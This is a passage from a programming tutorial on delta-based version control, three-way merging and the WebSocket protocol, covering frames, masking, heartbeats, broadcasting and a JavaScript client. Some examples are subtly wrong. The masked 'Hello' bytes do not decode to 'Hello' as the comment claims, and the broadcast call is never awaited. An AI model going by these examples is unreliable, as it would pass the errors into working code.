v1 = Revision("v1", None, datetime.now(), "john", "Initial", "hash1", 1024, "full", None)
content_v1 = b"Hello World\n" * 100
storage.store_revision(v1, content_v1)
graph.add_revision(v1)

# Store second version (as delta)
v2 = Revision("v2", "v1", datetime.now(), "jane", "Update", "hash2", 1124, "delta", "v1")
content_v2 = b"Hello Beautiful World\n" * 100
storage.store_revision(v2, content_v2, base_revision=v1)
graph.add_revision(v2)

# Retrieve
retrieved = storage.retrieve_revision("v2", graph)
assert retrieved == content_v2
```

**Compression Savings:**

```python
# Analyze compression ratios
import sys

# Original text file
text = "Hello World\n" * 1000
original_size = sys.getsizeof(text.encode())

# Compressed
compressed = zlib.compress(text.encode())
compressed_size = len(compressed)

compression_ratio = compressed_size / original_size
print(f"Original: {original_size} bytes")
print(f"Compressed: {compressed_size} bytes")
print(f"Ratio: {compression_ratio:.2%}")

# Typical results:
# Text files: 70-90% compression
# Binary files: 10-30% compression
# Already compressed (JPG, ZIP): ~0% (can't compress further)
```

---

### **Part 7: Version Control API - Complete Implementation**

```python
from typing import Optional, List
import hashlib
import json

class VersionControl:
    """
    Simple version control system for files.

    Features:
    - Track file revisions
    - Store efficiently with deltas
    - View history
    - Rollback to previous versions
    - Compare versions (diff)
    """

    def __init__(self, repo_dir: str):
        self.repo_dir = Path(repo_dir)
        self.repo_dir.mkdir(exist_ok=True)

        self.graph = RevisionGraph()
        self.storage = DeltaStorage(str(self.repo_dir / "objects"))

        self.metadata_file = self.repo_dir / "metadata.json"
        self._load_metadata()

    def _load_metadata(self):
        """Load revision metadata from disk."""
        if self.metadata_file.exists():
            with open(self.metadata_file, 'r') as f:
                data = json.load(f)

                for rev_data in data:
                    revision = Revision(**rev_data)
                    self.graph.add_revision(revision)

    def _save_metadata(self):
        """Save revision metadata to disk."""
        data = [
            {
                'revision_id': rev.revision_id,
                'parent_id': rev.parent_id,
                'timestamp': rev.timestamp.isoformat(),
                'author': rev.author,
                'message': rev.message,
                'content_hash': rev.content_hash,
                'file_size': rev.file_size,
                'storage_type': rev.storage_type,
                'delta_base': rev.delta_base
            }
            for rev in self.graph.revisions.values()
        ]

        with open(self.metadata_file, 'w') as f:
            json.dump(data, f, indent=2)

    def commit(self, filename: str, content: bytes,
               author: str, message: str) -> str:
        """
        Commit new version of file.

        Returns: revision_id
        """
        # Calculate content hash
        content_hash = hashlib.sha256(content).hexdigest()

        # Generate revision ID (hash of metadata + content)
        revision_data = f"{filename}:{content_hash}:{datetime.utcnow().isoformat()}"
        revision_id = hashlib.sha256(revision_data.encode()).hexdigest()[:16]

        # Find parent (latest revision)
        parent_id = self.get_latest_revision(filename)

        # Create revision
        revision = Revision(
            revision_id=revision_id,
            parent_id=parent_id,
            timestamp=datetime.utcnow(),
            author=author,
            message=message,
            content_hash=content_hash,
            file_size=len(content),
            storage_type="",  # Set by storage
            delta_base=None
        )

        # Store content
        base_revision = self.graph.revisions.get(parent_id) if parent_id else None
        self.storage.store_revision(revision, content, base_revision)

        # Add to graph
        self.graph.add_revision(revision)

        # Save metadata
        self._save_metadata()

        return revision_id

    def get_latest_revision(self, filename: str) -> Optional[str]:
        """Get ID of latest revision for file."""
        # Simplified: assumes linear history
        # Real implementation would track HEAD pointers per file

        # For now, just return most recent by timestamp
        revisions = sorted(
            self.graph.revisions.values(),
            key=lambda r: r.timestamp,
            reverse=True
        )

        return revisions[0].revision_id if revisions else None

    def checkout(self, revision_id: str) -> bytes:
        """
        Get file content at specific revision.

        Returns: file content as bytes
        """
        return self.storage.retrieve_revision(revision_id, self.graph)

    def get_history(self, limit: int = 10) -> List[Revision]:
        """Get recent revision history."""
        revisions = sorted(
            self.graph.revisions.values(),
            key=lambda r: r.timestamp,
            reverse=True
        )
        return revisions[:limit]

    def diff(self, rev1_id: str, rev2_id: str) -> str:
        """
        Get diff between two revisions.

        Returns: unified diff format
        """
        # Get content for both revisions
        content1 = self.checkout(rev1_id).decode('utf-8', errors='ignore')
        content2 = self.checkout(rev2_id).decode('utf-8', errors='ignore')

        # Split into lines
        lines1 = content1.splitlines()
        lines2 = content2.splitlines()

        # Generate diff
        return generate_unified_diff(
            lines1, lines2,
            old_name=f"revision {rev1_id[:8]}",
            new_name=f"revision {rev2_id[:8]}"
        )

    def rollback(self, revision_id: str, author: str, message: str) -> str:
        """
        Rollback to previous revision (creates new commit).

        This doesn't delete history - it creates new revision
        with old content. Preserves complete history.
        """
        # Get old content
        old_content = self.checkout(revision_id)

        # Create new commit with old content
        return self.commit(
            filename="file.txt",  # Would need to track this
            content=old_content,
            author=author,
            message=f"{message} (rollback to {revision_id[:8]})"
        )

# Usage example:
vc = VersionControl("./my_repo")

# Commit version 1
content1 = b"Hello World\n"
rev1 = vc.commit("file.txt", content1, "john@example.com", "Initial commit")

# Commit version 2
content2 = b"Hello Beautiful World\n"
rev2 = vc.commit("file.txt", content2, "jane@example.com", "Added 'Beautiful'")

# View history
history = vc.get_history()
for rev in history:
    print(f"{rev.revision_id[:8]} - {rev.author}: {rev.message}")

# Get diff
diff = vc.diff(rev1, rev2)
print(diff)

# Rollback to version 1
rev3 = vc.rollback(rev1, "admin@example.com", "Reverted changes")

# Verify
content_restored = vc.checkout(rev3)
assert content_restored == content1
```

---

### **Practice Exercise 1: Implement Three-Way Merge**

```python
def three_way_merge(base: List[str], yours: List[str],
                    theirs: List[str]) -> List[str]:
    """
    Perform three-way merge.

    Given:
    - base: Common ancestor
    - yours: Your changes
    - theirs: Their changes

    Algorithm:
    1. Diff base → yours
    2. Diff base → theirs
    3. Merge diffs:
       - Same changes: Accept
       - Different changes in different areas: Accept both
       - Different changes in same area: CONFLICT

    Returns: Merged lines (with conflict markers if needed)
    """
    # Your implementation
    pass

# Test:
base = ["line 1", "line 2", "line 3", "line 4"]
yours = ["line 1", "line 2a", "line 3", "line 4"]  # Changed line 2
theirs = ["line 1", "line 2", "line 3", "line 4a"]  # Changed line 4

merged = three_way_merge(base, yours, theirs)
# Should accept both changes:
# ["line 1", "line 2a", "line 3", "line 4a"]

# Solution:
def three_way_merge(base: List[str], yours: List[str],
                    theirs: List[str]) -> List[str]:
    # Compute diffs
    diff_yours = simple_diff(base, yours)
    diff_theirs = simple_diff(base, theirs)

    # Build change maps: line_num → change
    your_changes = {}
    their_changes = {}

    for item in diff_yours:
        if item['type'] != 'keep':
            line_num = item.get('old_line_num', item.get('new_line_num'))
            your_changes[line_num] = item

    for item in diff_theirs:
        if item['type'] != 'keep':
            line_num = item.get('old_line_num', item.get('new_line_num'))
            their_changes[line_num] = item

    # Merge
    result = []
    i = 0

    while i < len(base):
        line_num = i + 1

        if line_num in your_changes and line_num in their_changes:
            # Both changed same line
            your_change = your_changes[line_num]
            their_change = their_changes[line_num]

            if your_change == their_change:
                # Same change - accept
                if your_change['type'] == 'delete':
                    # Skip line
                    pass
                else:
                    result.append(your_change['line'])
            else:
                # Conflict!
                result.append("<<<<<<< YOURS")
                if your_change['type'] != 'delete':
                    result.append(your_change['line'])
                result.append("=======")
                if their_change['type'] != 'delete':
                    result.append(their_change['line'])
                result.append(">>>>>>> THEIRS")

        elif line_num in your_changes:
            # Only you changed
            change = your_changes[line_num]
            if change['type'] != 'delete':
                result.append(change['line'])

        elif line_num in their_changes:
            # Only they changed
            change = their_changes[line_num]
            if change['type'] != 'delete':
                result.append(change['line'])

        else:
            # No changes - keep base
            result.append(base[i])

        i += 1

    return result
```

---

Ready for Level 17 when you're ready. Next level will cover real-time updates with WebSockets, the WebSocket protocol, maintaining persistent connections, and broadcasting changes to multiple clients.

## **Level 17 Enhancement: Real-Time Updates - WebSocket Protocol**

**Reference:** Your tutorial implements WebSocket connections for real-time file updates and collaborative features.

**Depth Needed:** WebSockets represent a fundamental shift from HTTP's request-response model to persistent bidirectional communication. We need to understand the protocol at the byte level, connection management, broadcasting patterns, and the scalability challenges of maintaining thousands of persistent connections.

---

### **Part 1: The Real-Time Communication Problem**

**Why HTTP Polling is Inadequate:**

```javascript
// HTTP Polling (Bad for real-time)
setInterval(async () => {
  const response = await fetch("/api/files");
  const files = await response.json();
  updateUI(files);
}, 5000); // Poll every 5 seconds

// Problems:
// 1. Latency: Up to 5 second delay before seeing changes
// 2. Wasteful: 99% of requests return "no changes"
// 3. Server load: N clients × 12 requests/min = lots of overhead
// 4. Bandwidth: Full response every time (even if nothing changed)
// 5. Not truly real-time

// Example with 1000 clients:
// - 1000 clients × 12 requests/minute = 12,000 req/min
// - Most responses: "no changes" (wasted bandwidth)
// - Average latency: 2.5 seconds (half the poll interval)
```

**Evolution of Real-Time Techniques:**

```
1. Short Polling (1990s)
   Client → Server: Any updates?
   Server → Client: No
   [Wait 5 seconds]
   Client → Server: Any updates?
   Server → Client: No

   Latency: High (poll interval)
   Efficiency: Poor (constant requests)

2. Long Polling (2000s)
   Client → Server: Any updates?
   [Server holds connection open]
   [Update happens]
   Server → Client: Here's the update
   Client → Server: Any updates?

   Latency: Lower (immediate on update)
   Efficiency: Better (fewer requests)
   Problem: Still uses HTTP overhead

3. Server-Sent Events (2010s)
   Client → Server: Give me updates
   Server → Client: update 1
   Server → Client: update 2
   [Connection stays open]

   Latency: Low
   Efficiency: Good
   Limitation: Unidirectional (server → client only)

4. WebSockets (2011+)
   Client ↔ Server: Persistent bidirectional connection

   Latency: Minimal
   Efficiency: Excellent
   Full duplex: Both directions simultaneously
```

---

### **Part 2: WebSocket Protocol - The Opening Handshake**

**The HTTP Upgrade Mechanism:**

```http
Client Request (HTTP):
GET /ws HTTP/1.1
Host: example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13

Server Response (HTTP → WebSocket):
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=

[Connection is now WebSocket - no more HTTP]
```

**The Handshake Algorithm:**

```python
import hashlib
import base64

def compute_websocket_accept(sec_websocket_key: str) -> str:
    """
    Compute Sec-WebSocket-Accept header value.

    Algorithm (RFC 6455):
    1. Concatenate client key with magic GUID
    2. SHA-1 hash the result
    3. Base64 encode the hash

    Magic GUID: 258EAFA5-E914-47DA-95CA-C5AB0DC85B11
    (Defined in RFC, prevents cross-protocol attacks)

    Time Complexity: O(1)
    """
    # Magic string from RFC 6455
    GUID = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"

    # Concatenate
    combined = sec_websocket_key + GUID

    # SHA-1 hash
    sha1_hash = hashlib.sha1(combined.encode('utf-8')).digest()

    # Base64 encode
    accept_key = base64.b64encode(sha1_hash).decode('utf-8')

    return accept_key

# Example:
client_key = "dGhlIHNhbXBsZSBub25jZQ=="
accept_key = compute_websocket_accept(client_key)
print(accept_key)  # "s3pPLMBiTxaQ9kYGzzhZRbK+xOo="

# Why this dance?
# 1. Prevents accidental WebSocket connections (must be intentional)
# 2. Ensures server understands WebSocket protocol
# 3. Prevents cross-protocol attacks (HTTP cache poisoning)
```

**The Sec-WebSocket-Key Generation:**

```javascript
// Client-side JavaScript automatically generates this
const ws = new WebSocket("ws://example.com/ws");

// Under the hood, browser generates random key:
function generateWebSocketKey() {
  // 16 random bytes
  const bytes = new Uint8Array(16);
  crypto.getRandomValues(bytes);

  // Base64 encode
  return btoa(String.fromCharCode(...bytes));
}

// Example output: "dGhlIHNhbXBsZSBub25jZQ=="
// Not cryptographically significant - just ensures proper handshake
```

---

### **Part 3: WebSocket Frame Structure - The Binary Protocol**

**Frame Format (RFC 6455):**

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-------+-+-------------+-------------------------------+
|F|R|R|R| opcode|M| Payload len |    Extended payload length    |
|I|S|S|S|  (4)  |A|     (7)     |             (16/64)           |
|N|V|V|V|       |S|             |   (if payload len==126/127)   |
| |1|2|3|       |K|             |                               |
+-+-+-+-+-------+-+-------------+ - - - - - - - - - - - - - - - +
|     Extended payload length continued, if payload len == 127  |
+ - - - - - - - - - - - - - - - +-------------------------------+
|                               |Masking-key, if MASK set to 1  |
+-------------------------------+-------------------------------+
| Masking-key (continued)       |          Payload Data         |
+-------------------------------- - - - - - - - - - - - - - - - +
:                     Payload Data continued ...                :
+ - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - +
|                     Payload Data continued ...                |
+---------------------------------------------------------------+
```

**Frame Fields Explained:**

```python
# Byte 0: FIN + RSV + Opcode
FIN  (1 bit):  Final frame? (1=yes, 0=more frames coming)
RSV1-3 (3 bits): Reserved (must be 0)
Opcode (4 bits): Frame type

Opcodes:
0x0 = Continuation frame
0x1 = Text frame (UTF-8)
0x2 = Binary frame
0x8 = Connection close
0x9 = Ping
0xA = Pong

# Byte 1: MASK + Payload Length
MASK (1 bit): Is payload masked? (client→server: always 1)
Payload len (7 bits): Length encoding

If len < 126:  Actual length
If len == 126: Next 2 bytes are length (16-bit)
If len == 127: Next 8 bytes are length (64-bit)

# Bytes 2-5 (if MASK=1): Masking key (4 bytes)
# Remaining bytes: Payload data (possibly masked)
```

**Parsing a WebSocket Frame:**

```python
from dataclasses import dataclass
from typing import Optional

@dataclass
class WebSocketFrame:
    fin: bool
    opcode: int
    masked: bool
    payload: bytes

    # Frame type helpers
    def is_text(self) -> bool:
        return self.opcode == 0x1

    def is_binary(self) -> bool:
        return self.opcode == 0x2

    def is_close(self) -> bool:
        return self.opcode == 0x8

    def is_ping(self) -> bool:
        return self.opcode == 0x9

    def is_pong(self) -> bool:
        return self.opcode == 0xA

def parse_websocket_frame(data: bytes) -> WebSocketFrame:
    """
    Parse WebSocket frame from bytes.

    Time Complexity: O(n) where n = payload length (for unmasking)
    Space Complexity: O(n) for payload copy
    """
    if len(data) < 2:
        raise ValueError("Frame too short")

    # Byte 0: FIN + opcode
    byte0 = data[0]
    fin = bool(byte0 & 0b10000000)
    opcode = byte0 & 0b00001111

    # Byte 1: MASK + payload length
    byte1 = data[1]
    masked = bool(byte1 & 0b10000000)
    payload_len = byte1 & 0b01111111

    # Determine actual payload length
    offset = 2

    if payload_len == 126:
        # Next 2 bytes are length
        if len(data) < 4:
            raise ValueError("Frame too short for extended length")
        payload_len = int.from_bytes(data[2:4], byteorder='big')
        offset = 4

    elif payload_len == 127:
        # Next 8 bytes are length
        if len(data) < 10:
            raise ValueError("Frame too short for extended length")
        payload_len = int.from_bytes(data[2:10], byteorder='big')
        offset = 10

    # Masking key (if present)
    masking_key = None
    if masked:
        if len(data) < offset + 4:
            raise ValueError("Frame too short for masking key")
        masking_key = data[offset:offset + 4]
        offset += 4

    # Payload
    if len(data) < offset + payload_len:
        raise ValueError("Frame too short for payload")

    payload = data[offset:offset + payload_len]

    # Unmask payload if needed
    if masked and masking_key:
        payload = unmask_payload(payload, masking_key)

    return WebSocketFrame(
        fin=fin,
        opcode=opcode,
        masked=masked,
        payload=payload
    )

def unmask_payload(payload: bytes, masking_key: bytes) -> bytes:
    """
    Unmask WebSocket payload.

    Algorithm: XOR each byte with corresponding mask byte

    payload[i] XOR masking_key[i % 4]

    Time Complexity: O(n) where n = payload length
    """
    unmasked = bytearray(len(payload))

    for i in range(len(payload)):
        # XOR with corresponding mask byte (cycles every 4 bytes)
        unmasked[i] = payload[i] ^ masking_key[i % 4]

    return bytes(unmasked)

# Example: Parse a simple text frame
frame_bytes = bytes([
    0b10000001,  # FIN=1, opcode=1 (text)
    0b10000101,  # MASK=1, len=5
    0x12, 0x34, 0x56, 0x78,  # Masking key
    0x7b, 0x51, 0x33, 0x15, 0x47  # Masked "Hello"
])

frame = parse_websocket_frame(frame_bytes)
print(frame.payload.decode('utf-8'))  # "Hello"
```

**Why Masking? (Security)**

```
Client → Server: Always masked
Server → Client: Never masked

Reason: Prevent cache poisoning attacks

Attack scenario (if no masking):
1. Attacker crafts WebSocket frame that looks like HTTP
2. Sends through WebSocket connection
3. Middlebox (proxy, cache) misinterprets as HTTP
4. Caches malicious response
5. Serves cached response to other users

Masking prevents this:
- XOR operation makes payload unpredictable
- Can't craft frame that looks like HTTP
- Middleboxes can't be confused

Example:
Original: "GET /evil HTTP/1.1\r\n..."
Masked:   [random bytes] (doesn't resemble HTTP)
```

---

### **Part 4: Connection Lifecycle Management**

**Connection States:**

```python
from enum import Enum

class WebSocketState(Enum):
    CONNECTING = "connecting"  # Handshake in progress
    OPEN = "open"             # Ready to send/receive
    CLOSING = "closing"       # Close handshake initiated
    CLOSED = "closed"         # Connection terminated

class WebSocketConnection:
    """
    Manage WebSocket connection lifecycle.
    """
    def __init__(self, websocket):
        self.websocket = websocket
        self.state = WebSocketState.CONNECTING
        self.last_ping = None
        self.last_pong = None
        self.message_queue = []

    async def accept(self):
        """Accept connection (complete handshake)."""
        await self.websocket.accept()
        self.state = WebSocketState.OPEN
        self.last_ping = datetime.utcnow()

    async def send_text(self, message: str):
        """Send text message."""
        if self.state != WebSocketState.OPEN:
            raise ConnectionError("WebSocket not open")

        await self.websocket.send_text(message)

    async def send_json(self, data: dict):
        """Send JSON message."""
        import json
        await self.send_text(json.dumps(data))

    async def receive(self) -> dict:
        """Receive and parse message."""
        if self.state != WebSocketState.OPEN:
            raise ConnectionError("WebSocket not open")

        try:
            message = await self.websocket.receive_text()
            return json.loads(message)
        except Exception as e:
            await self.close(code=1002, reason=f"Parse error: {e}")
            raise

    async def ping(self):
        """Send ping frame."""
        await self.websocket.send_bytes(b'\x89\x00')  # Ping frame
        self.last_ping = datetime.utcnow()

    async def close(self, code: int = 1000, reason: str = ""):
        """Initiate close handshake."""
        if self.state in [WebSocketState.CLOSING, WebSocketState.CLOSED]:
            return

        self.state = WebSocketState.CLOSING

        try:
            await self.websocket.close(code=code, reason=reason)
        finally:
            self.state = WebSocketState.CLOSED

    def is_alive(self, timeout_seconds: int = 30) -> bool:
        """Check if connection is still alive based on ping/pong."""
        if self.state != WebSocketState.OPEN:
            return False

        if self.last_pong is None:
            # No pong received yet - check ping time
            if self.last_ping:
                age = (datetime.utcnow() - self.last_ping).total_seconds()
                return age < timeout_seconds
            return True

        # Check time since last pong
        age = (datetime.utcnow() - self.last_pong).total_seconds()
        return age < timeout_seconds
```

**WebSocket Close Codes (RFC 6455):**

```python
CLOSE_CODES = {
    1000: "Normal closure",
    1001: "Going away (server shutdown, browser navigation)",
    1002: "Protocol error",
    1003: "Unsupported data type",
    1004: "Reserved",
    1005: "No status code present (internal use only)",
    1006: "Abnormal closure (internal use only)",
    1007: "Invalid payload data (e.g., non-UTF-8 in text frame)",
    1008: "Policy violation",
    1009: "Message too big",
    1010: "Extension negotiation failed",
    1011: "Unexpected server error",
    1015: "TLS handshake failed (internal use only)"
}

# Usage:
await websocket.close(code=1000, reason="Normal closure")
await websocket.close(code=1008, reason="Authentication required")
await websocket.close(code=1009, reason="Message exceeds 1 MB limit")
```

**Heartbeat Pattern (Ping/Pong):**

```python
import asyncio
from datetime import datetime, timedelta

class HeartbeatManager:
    """
    Manage WebSocket heartbeats to detect dead connections.

    Strategy:
    1. Server sends PING every N seconds
    2. Client responds with PONG
    3. If no PONG received within timeout, close connection
    """

    def __init__(self, connection: WebSocketConnection,
                 ping_interval: int = 30,
                 pong_timeout: int = 10):
        self.connection = connection
        self.ping_interval = ping_interval
        self.pong_timeout = pong_timeout
        self.running = False

    async def start(self):
        """Start heartbeat loop."""
        self.running = True

        while self.running and self.connection.state == WebSocketState.OPEN:
            # Send ping
            await self.connection.ping()

            # Wait for interval
            await asyncio.sleep(self.ping_interval)

            # Check if connection is still alive
            if not self.connection.is_alive(self.pong_timeout):
                # No pong received - connection is dead
                await self.connection.close(
                    code=1001,
                    reason="Ping timeout"
                )
                break

    def stop(self):
        """Stop heartbeat loop."""
        self.running = False

# Usage in endpoint:
@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    connection = WebSocketConnection(websocket)
    await connection.accept()

    # Start heartbeat
    heartbeat = HeartbeatManager(connection)
    heartbeat_task = asyncio.create_task(heartbeat.start())

    try:
        while True:
            message = await connection.receive()
            # Process message...

    except WebSocketDisconnect:
        heartbeat.stop()

    finally:
        heartbeat_task.cancel()
```

---

### **Part 5: Broadcasting Pattern - Pub/Sub Architecture**

**The Broadcasting Problem:**

```python
# Naive approach: Store all connections
connections = []

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await websocket.accept()
    connections.append(websocket)

    try:
        while True:
            await websocket.receive_text()
    finally:
        connections.remove(websocket)

# Broadcast to all
async def broadcast(message: str):
    for connection in connections:
        await connection.send_text(message)

# Problems:
# 1. No error handling (dead connections stay in list)
# 2. Blocking (waits for each send to complete)
# 3. No filtering (all clients get all messages)
# 4. Memory leak (disconnected clients not cleaned up)
```

**Connection Manager Pattern:**

```python
from typing import Set, Dict, List
import asyncio

class ConnectionManager:
    """
    Manage WebSocket connections with broadcasting support.

    Features:
    - Track active connections
    - Broadcast to all or filtered subset
    - Handle disconnections gracefully
    - Non-blocking sends
    """

    def __init__(self):
        self.active_connections: Set[WebSocketConnection] = set()
        self.subscriptions: Dict[str, Set[WebSocketConnection]] = {}

    async def connect(self, connection: WebSocketConnection) -> None:
        """Register new connection."""
        await connection.accept()
        self.active_connections.add(connection)

    def disconnect(self, connection: WebSocketConnection) -> None:
        """Remove connection."""
        self.active_connections.discard(connection)

        # Remove from all subscriptions
        for subscribers in self.subscriptions.values():
            subscribers.discard(connection)

    def subscribe(self, connection: WebSocketConnection, channel: str) -> None:
        """Subscribe connection to channel."""
        if channel not in self.subscriptions:
            self.subscriptions[channel] = set()

        self.subscriptions[channel].add(connection)

    def unsubscribe(self, connection: WebSocketConnection, channel: str) -> None:
        """Unsubscribe from channel."""
        if channel in self.subscriptions:
            self.subscriptions[channel].discard(connection)

    async def broadcast(self, message: dict) -> None:
        """
        Broadcast to all active connections.

        Non-blocking: Creates tasks for all sends, doesn't wait.

        Time Complexity: O(n) where n = number of connections
        """
        if not self.active_connections:
            return

        # Create send tasks
        tasks = [
            self._send_safe(conn, message)
            for conn in self.active_connections
        ]

        # Execute all concurrently (don't wait)
        asyncio.gather(*tasks, return_exceptions=True)

    async def broadcast_to_channel(self, channel: str, message: dict) -> None:
        """Broadcast to specific channel subscribers."""
        subscribers = self.subscriptions.get(channel, set())

        if not subscribers:
            return

        tasks = [
            self._send_safe(conn, message)
            for conn in subscribers
        ]

        asyncio.gather(*tasks, return_exceptions=True)

    async def _send_safe(self, connection: WebSocketConnection,
                         message: dict) -> None:
        """
        Send message with error handling.

        If send fails, disconnect the client.
        """
        try:
            await connection.send_json(message)
        except Exception as e:
            print(f"Error sending to {connection}: {e}")
            self.disconnect(connection)

    def get_connection_count(self) -> int:
        """Get number of active connections."""
        return len(self.active_connections)

    def get_channel_subscribers(self, channel: str) -> int:
        """Get number of subscribers to channel."""
        return len(self.subscriptions.get(channel, set()))

# Global manager
manager = ConnectionManager()

# Usage:
@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    connection = WebSocketConnection(websocket)
    await manager.connect(connection)

    try:
        while True:
            data = await connection.receive()

            # Handle subscription
            if data.get('action') == 'subscribe':
                channel = data.get('channel')
                manager.subscribe(connection, channel)

            # Handle message
            elif data.get('action') == 'message':
                channel = data.get('channel')
                await manager.broadcast_to_channel(channel, {
                    'type': 'message',
                    'content': data.get('content')
                })

    except WebSocketDisconnect:
        pass

    finally:
        manager.disconnect(connection)

# Broadcast from anywhere in application
async def notify_file_changed(filename: str):
    await manager.broadcast({
        'type': 'file_changed',
        'filename': filename,
        'timestamp': datetime.utcnow().isoformat()
    })
```

---

### **Part 6: Message Protocol Design**

**Message Format Convention:**

```python
# Well-structured message protocol
MESSAGE_FORMAT = {
    "type": "event_name",      # Message type (required)
    "data": {...},             # Payload (optional)
    "timestamp": "ISO-8601",   # When sent (optional)
    "id": "unique_id"          # Message ID for deduplication (optional)
}

# Examples:

# File updated event
{
    "type": "file_updated",
    "data": {
        "filename": "document.pdf",
        "updated_by": "john@example.com",
        "size": 1024000
    },
    "timestamp": "2025-10-03T14:30:00Z",
    "id": "msg_abc123"
}

# User joined event
{
    "type": "user_joined",
    "data": {
        "username": "jane",
        "user_id": "user_456"
    },
    "timestamp": "2025-10-03T14:31:00Z"
}

# Error message
{
    "type": "error",
    "data": {
        "code": "UNAUTHORIZED",
        "message": "Authentication required"
    }
}
```

**Message Handler Pattern:**

```python
from typing import Callable, Dict
import json

class MessageRouter:
    """
    Route incoming WebSocket messages to handlers.

    Pattern: Command pattern + Strategy pattern
    """

    def __init__(self):
        self.handlers: Dict[str, Callable] = {}

    def register(self, message_type: str, handler: Callable):
        """
        Register handler for message type.

        Handler signature: async def handler(connection, data) -> dict
        """
        self.handlers[message_type] = handler

    def handler(self, message_type: str):
        """Decorator to register handler."""
        def decorator(func: Callable):
            self.register(message_type, func)
            return func
        return decorator

    async def route(self, connection: WebSocketConnection,
                    message: dict) -> dict:
        """
        Route message to appropriate handler.

        Returns: Response message
        """
        message_type = message.get('type')

        if not message_type:
            return {
                'type': 'error',
                'data': {'message': 'Missing message type'}
            }

        handler = self.handlers.get(message_type)

        if not handler:
            return {
                'type': 'error',
                'data': {'message': f'Unknown message type: {message_type}'}
            }

        try:
            data = message.get('data', {})
            result = await handler(connection, data)
            return result or {'type': 'success'}

        except Exception as e:
            return {
                'type': 'error',
                'data': {'message': str(e)}
            }

# Global router
router = MessageRouter()

# Register handlers
@router.handler('checkout_file')
async def handle_checkout(connection: WebSocketConnection, data: dict):
    filename = data.get('filename')
    user = connection.user  # Assume set during auth

    # Perform checkout
    result = checkout_file(filename, user)

    # Broadcast to other users
    await manager.broadcast({
        'type': 'file_locked',
        'data': {
            'filename': filename,
            'locked_by': user['email']
        }
    })

    return {
        'type': 'checkout_success',
        'data': result
    }

@router.handler('subscribe')
async def handle_subscribe(connection: WebSocketConnection, data: dict):
    channel = data.get('channel')
    manager.subscribe(connection, channel)

    return {
        'type': 'subscribed',
        'data': {'channel': channel}
    }

# Use in endpoint
@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    connection = WebSocketConnection(websocket)
    await manager.connect(connection)

    try:
        while True:
            message = await connection.receive()
            response = await router.route(connection, message)
            await connection.send_json(response)

    except WebSocketDisconnect:
        pass

    finally:
        manager.disconnect(connection)
```

---

### **Part 7: Client-Side WebSocket Implementation**

**JavaScript WebSocket API:**

```javascript
class WebSocketClient {
  /**
   * WebSocket client with reconnection and message handling.
   */
  constructor(url) {
    this.url = url;
    this.ws = null;
    this.reconnectInterval = 1000; // Start at 1 second
    this.maxReconnectInterval = 30000; // Max 30 seconds
    this.reconnectAttempts = 0;
    this.handlers = new Map();
    this.connected = false;
  }

  connect() {
    this.ws = new WebSocket(this.url);

    this.ws.onopen = (event) => {
      console.log("WebSocket connected");
      this.connected = true;
      this.reconnectAttempts = 0;
      this.reconnectInterval = 1000;

      this.trigger("open", event);
    };

    this.ws.onmessage = (event) => {
      try {
        const message = JSON.parse(event.data);
        this.handleMessage(message);
      } catch (e) {
        console.error("Failed to parse message:", e);
      }
    };

    this.ws.onerror = (error) => {
      console.error("WebSocket error:", error);
      this.trigger("error", error);
    };

    this.ws.onclose = (event) => {
      console.log("WebSocket closed:", event.code, event.reason);
      this.connected = false;
      this.trigger("close", event);

      // Attempt reconnection
      if (!event.wasClean) {
        this.reconnect();
      }
    };
  }

  reconnect() {
    this.reconnectAttempts++;

    console.log(
      `Reconnecting in ${this.reconnectInterval}ms (attempt ${this.reconnectAttempts})`
    );

    setTimeout(() => {
      this.connect();
    }, this.reconnectInterval);

    // Exponential backoff
    this.reconnectInterval = Math.min(
      this.reconnectInterval * 2,
      this.maxReconnectInterval
    );
  }

  send(type, data = {}) {
    if (!this.connected) {
      console.warn("WebSocket not connected");
      return false;
    }

    const message = {
      type: type,
      data: data,
      timestamp: new Date().toISOString(),
    };

    this.ws.send(JSON.stringify(message));
    return true;
  }

  on(messageType, handler) {
    /**
     * Register handler for message type.
     *
     * handler(data) is called when message received
     */
    if (!this.handlers.has(messageType)) {
      this.handlers.set(messageType, []);
    }

    this.handlers.get(messageType).push(handler);
  }

  handleMessage(message) {
    const type = message.type;
    const handlers = this.handlers.get(type) || [];

    for (const handler of handlers) {
      try {
        handler(message.data);
      } catch (e) {
        console.error(`Error in handler for ${type}:`, e);
      }
    }
  }

  trigger(event, data) {
    /**
     * Trigger internal event (open, close, error).
     */
    const handlers = this.handlers.get(event) || [];
    for (const handler of handlers) {
      handler(data);
    }
  }

  close() {
    if (this.ws) {
      this.ws.close(1000, "Client closing");
    }
  }
}

// Usage:
const ws = new WebSocketClient("ws://localhost:8000/ws");

// Register handlers
ws.on("open", () => {
  console.log("Connected!");

  // Subscribe to file updates
  ws.send("subscribe", { channel: "files" });
});

ws.on("file_updated", (data) => {
  console.log("File updated:", data.filename);
  // Update UI
  updateFileInList(data.filename, data);
});

ws.on("file_locked", (data) => {
  console.log(`${data.filename} locked by ${data.locked_by}`);
  // Show lock icon
  showFileLocked(data.filename, data.locked_by);
});

ws.on("error", (error) => {
  console.error("Connection error:", error);
  showNotification("Connection error", "error");
});

ws.on("close", (event) => {
  if (event.wasClean) {
    console.log("Connection closed cleanly");
  } else {
    console.log("Connection lost, reconnecting...");
    showNotification("Connection lost, reconnecting...", "warning");
  }
});

// Connect
ws.connect();

// Send messages
document.getElementById("checkout-btn").addEventListener("click", () => {
  const filename = getSelectedFile();
  ws.send("checkout_file", { filename: filename });
});
```

**Handling Reconnection State:**

```javascript
class ReconnectionManager {
  /**
   * Manage reconnection with queued messages and state restoration.
   */
  constructor(wsClient) {
    this.wsClient = wsClient;
    this.messageQueue = [];
    this.maxQueueSize = 100;
